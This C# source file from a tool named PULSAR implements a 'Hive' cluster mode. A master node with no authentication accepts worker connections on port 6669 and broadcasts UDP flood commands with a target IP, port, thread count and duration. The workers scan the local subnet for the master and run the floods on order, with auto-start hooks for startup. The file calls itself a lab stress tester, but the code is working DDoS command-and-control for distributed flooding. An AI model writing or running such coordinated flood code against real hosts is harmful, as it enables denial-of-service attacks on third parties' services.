// SPDX-License-Identifier: MIT
using System.Net;
using System.Net.Sockets;
using PULSAR.Attacks;
using PULSAR.Core;
using PULSAR.Networking;
using PULSAR.UI;

namespace PULSAR.Cluster;

/// <summary>
/// TCP-based cluster system for coordinated multi-node stress testing.
/// One machine acts as Master, one or more machines act as Slaves connected over LAN.
/// <strong>No authentication is performed — intended for isolated lab networks only.</strong>
/// </summary>
public static class ClusterSystem
{
    private const int CLUSTER_PORT = 6669;
    private static readonly List<TcpClient> Slaves = new();
    private static TcpListener? MasterListener;
    private static TcpClient? SlaveClient;
    private static bool IsMaster = false;
    private static CancellationTokenSource? _currentAttackCts;

    /// <summary>
    /// Shows the cluster mode role selection menu.
    /// </summary>
    public static async Task RunClusterMenu(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);
        ModernUI.DrawBox("CLUSTER MODE (HIVE)", () =>
        {
            Console.WriteLine("   Connect multiple devices on the local network");
            Console.WriteLine("   to perform coordinated stresser attacks.");
            Console.WriteLine();
            Console.WriteLine("   Note: No authentication required - LAN only");
        });
        Console.WriteLine();
        ModernUI.DrawMenuOption("1", "MASTER (Controller)");
        ModernUI.DrawMenuOption("2", "SLAVE (Worker - Auto-Connect)");
        Console.WriteLine();
        string choice = ModernUI.Prompt("Select Role");
        if (choice == "1") await RunMaster(token);
        else if (choice == "2") await RunSlave(token);
    }

    /// <summary>
    /// Starts master mode automatically (for startup integration).
    /// </summary>
    public static async Task RunMasterAutoStart(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.Print("Starting Cluster Master (Auto-Start Mode)...", ModernUI.MsgType.Info);
        await Task.Delay(1000);
        await RunMaster(token);
    }

    /// <summary>
    /// Starts slave mode automatically (for startup integration).
    /// </summary>
    public static async Task RunSlaveAutoStart(CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.Print("Starting Cluster Slave (Auto-Start Mode)...", ModernUI.MsgType.Info);
        await Task.Delay(1000);
        await RunSlave(token);
    }

    /// <summary>
    /// Runs the cluster master listener and command interface.
    /// Accepts TCP connections from slaves and broadcasts attack commands.
    /// </summary>
    private static async Task RunMaster(CancellationToken token)
    {
        try
        {
            if (MasterListener == null)
            {
                MasterListener = new TcpListener(IPAddress.Any, CLUSTER_PORT);
                MasterListener.Start();
            }
            IsMaster = true;
        }
        catch
        {
            ModernUI.Print("Failed to start Master listener (Port busy?)", ModernUI.MsgType.Error);
            ModernUI.Pause();
            return;
        }

        _ = Task.Run(async () =>
        {
            while (IsMaster)
            {
                try
                {
                    var client = await MasterListener!.AcceptTcpClientAsync();
                    lock (Slaves) Slaves.Add(client);

                    var endpoint = (IPEndPoint)client.Client.RemoteEndPoint!;
                    ModernUI.Print($"Slave connected: {endpoint.Address}", ModernUI.MsgType.Success);
                }
                catch
                {
                    // Listener closed or accept interrupted
                }
            }
        });

        while (!token.IsCancellationRequested)
        {
            ModernUI.DrawLogo();
            Console.WriteLine($"   {ModernUI.C_YELLOW}MASTER MODE ACTIVE{ModernUI.C_RESET} | PORT: {CLUSTER_PORT}");
            Console.WriteLine($"   {ModernUI.C_GRAY}Connected Slaves: {Slaves.Count}{ModernUI.C_RESET}\n");

            if (Slaves.Count > 0)
            {
                Console.WriteLine("   Connected Nodes:");
                lock (Slaves)
                {
                    foreach (var s in Slaves)
                    {
                        try { Console.WriteLine($"   - {((IPEndPoint)s.Client.RemoteEndPoint!).Address}"); }
                        catch
                        {
                            // Slave disconnected between lock and display
                        }
                    }
                }
                Console.WriteLine();
            }

            ModernUI.DrawMenuOption("1", "Refresh List");
            ModernUI.DrawMenuOption("2", "Execute Cluster Attack");
            ModernUI.DrawMenuOption("X", "Stop Master");

            Console.WriteLine();
            string cmd = ModernUI.Prompt("Command", "1");
            if (cmd == "2")
            {
                if (Slaves.Count == 0) { ModernUI.Print("No slaves connected.", ModernUI.MsgType.Error); ModernUI.Pause(); continue; }

                string target = ModernUI.Prompt("Target IP");
                if (!BlacklistManager.IsTargetAllowed(target))
                {
                    ModernUI.Print("Blacklisted Target.", ModernUI.MsgType.Error); ModernUI.Pause(); continue;
                }

                string port = ModernUI.Prompt("Port", "80");
                string threads = ModernUI.Prompt("Threads per Node", "50");
                string time = ModernUI.Prompt("Duration (s)", "30");

                string payload = $"ATTACK|UDP|{target}|{port}|{threads}|{time}";

                ModernUI.Print($"Broadcasting command to {Slaves.Count} nodes...", ModernUI.MsgType.Wait);

                List<TcpClient> currentSlaves;
                lock (Slaves) { currentSlaves = new List<TcpClient>(Slaves); }
                var disconnected = new List<TcpClient>();
                foreach (var s in currentSlaves)
                {
                    try
                    {
                        var writer = new StreamWriter(s.GetStream()) { AutoFlush = true };
                        await writer.WriteLineAsync(payload);
                    }
                    catch { disconnected.Add(s); }
                }
                if (disconnected.Count > 0)
                {
                    lock (Slaves) { foreach (var d in disconnected) Slaves.Remove(d); }
                }

                string localRun = ModernUI.Prompt("Participate as Master? (y/n)", "y");

                using var masterCts = new CancellationTokenSource();
                ConsoleCancelEventHandler cancelHandler = (s, e) =>
                {
                    e.Cancel = true;
                    masterCts.Cancel();

                    lock (Slaves) { currentSlaves = new List<TcpClient>(Slaves); }
                    foreach (var slave in currentSlaves)
                    {
                        try
                        {
                            var w = new StreamWriter(slave.GetStream()) { AutoFlush = true };
                            w.WriteLineAsync("STOP");
                        }
                        catch
                        {
                            // Slave may have already disconnected
                        }
                    }
                    Console.WriteLine($"\n   {ModernUI.C_RED}Attack Cancelled by Master (Ctrl+C). Stopping Hive...{ModernUI.C_RESET}");
                };

                Console.CancelKeyPress += cancelHandler;

                try
                {
                    if (localRun.ToLower() == "y")
                    {
                        await new AttackManager().RunAttack("UDP", target, int.Parse(port), int.Parse(threads), int.Parse(time), masterCts.Token);
                    }
                    else
                    {
                        ModernUI.Print("Attack running on slaves. Press Ctrl+C to stop.", ModernUI.MsgType.Info);
                        try { await Task.Delay(int.Parse(time) * 1000, masterCts.Token); }
                        catch
                        {
                            // Delay cancelled by Ctrl+C
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    ModernUI.Print("Master cycle interrupted.", ModernUI.MsgType.Warning);
                }
                finally
                {
                    Console.CancelKeyPress -= cancelHandler;
                }

                ModernUI.Print("Returned to Cluster Mode.", ModernUI.MsgType.Success);
                await Task.Delay(1000);
            }
            else if (cmd.ToLower() == "x")
            {
                IsMaster = false;
                MasterListener?.Stop();
                MasterListener = null;
                return;
            }
        }
    }

    /// <summary>
    /// Runs the cluster slave mode. Scans the local subnet for a master,
    /// connects to it, and waits for attack commands.
    /// </summary>
    private static async Task RunSlave(CancellationToken token)
    {
        ModernUI.DrawLogo();

        ModernUI.Print("Scanning local network for Master...", ModernUI.MsgType.Wait);
        string localIp = NetworkUtils.GetLocalIPAddress();
        string baseIp = localIp.Substring(0, localIp.LastIndexOf('.'));

        string? masterIp = null;

        var tasks = Enumerable.Range(1, 254).Select(async i =>
        {
            try
            {
                using var c = new TcpClient();
                var connectTask = c.ConnectAsync($"{baseIp}.{i}", CLUSTER_PORT);
                if (await Task.WhenAny(connectTask, Task.Delay(100)) == connectTask)
                {
                    if (c.Connected) masterIp = $"{baseIp}.{i}";
                }
            }
            catch
            {
                // Host unreachable or port closed - continue scanning
            }
        });
        await Task.WhenAll(tasks);

        if (masterIp == null)
        {
            ModernUI.Print("Master not found (Ensure it's running on LAN).", ModernUI.MsgType.Error);
            ModernUI.Pause();
            return;
        }

        try
        {
            SlaveClient = new TcpClient();
            await SlaveClient.ConnectAsync(masterIp, CLUSTER_PORT);

            ModernUI.Print($"Connected to Master at {masterIp}", ModernUI.MsgType.Success);
            ModernUI.Print("Waiting for commands...", ModernUI.MsgType.Wait);

            var reader = new StreamReader(SlaveClient.GetStream());

            while (SlaveClient.Connected && !token.IsCancellationRequested)
            {
                string? line = await reader.ReadLineAsync();
                if (line == null) break;

                if (line.StartsWith("ATTACK"))
                {
                    var parts = line.Split('|');
                    if (parts.Length == 6)
                    {
                        string target = parts[2];
                        if (!BlacklistManager.IsTargetAllowed(target))
                        {
                            ModernUI.Print($"Ignored command for blacklisted target: {target}", ModernUI.MsgType.Warning);
                            continue;
                        }
                        int port = int.Parse(parts[3]);
                        int th = int.Parse(parts[4]);
                        int dur = int.Parse(parts[5]);

                        _currentAttackCts?.Cancel();
                        _currentAttackCts = new CancellationTokenSource();
                        ModernUI.Print($"EXECUTING ORDER 66 -> {target}:{port}", ModernUI.MsgType.Warning);

                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                await new AttackManager().RunAttack("UDP", target, port, th, dur, _currentAttackCts.Token);
                                ModernUI.Print("Waiting for commands...", ModernUI.MsgType.Wait);
                            }
                            catch (OperationCanceledException)
                            {
                                ModernUI.Print("Attack Cancelled by Master.", ModernUI.MsgType.Warning);
                                ModernUI.Print("Waiting for commands...", ModernUI.MsgType.Wait);
                            }
                        });
                    }
                }
                else if (line == "STOP")
                {
                    _currentAttackCts?.Cancel();
                }
            }
        }
        catch (Exception ex)
        {
            ModernUI.Print($"Disconnected: {ex.Message}", ModernUI.MsgType.Error);
            ModernUI.Pause();
        }
    }
}